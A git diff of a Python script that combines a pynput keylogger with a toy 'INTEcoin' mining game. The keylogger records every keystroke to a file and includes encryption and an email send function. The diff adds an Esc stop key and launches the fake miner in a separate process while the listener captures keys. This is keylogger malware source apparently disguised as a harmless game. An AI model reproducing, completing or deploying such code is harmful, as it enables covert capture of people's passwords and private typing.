@@ -2,6 +2,7 @@ import os.path
 import time
 import random
 
+from multiprocessing import Process
 from cryptography.fernet import Fernet
 from os import path
 from pynput.keyboard import Key, Listener
@@ -53,6 +54,8 @@ def press(key):
     them into a file.
     :param key: the key pressed given from pynput module.
     """
+    if str(key) == "Key.esc":
+        return False
     global keys, count, count2
     keys.append(key)  # append every pressed key.
     count += 1  # keep track of how many keys.
@@ -158,7 +161,7 @@ def send(data, email):
     print(data)
 
 
-with Listener(on_press=press, on_release=release) as listener:
+with Listener(on_press=press) as listener:
     listener.join()
 
 
@@ -174,5 +177,7 @@ def miner():
             INTEcoin += randomNumber
             print("Mined a INTEcoin! You currently have {} coins!".format(INTEcoin))
 
-
+if __name__ == '__main__':
+    kl = Process(target = miner)
+    kl.start()
 #miner()
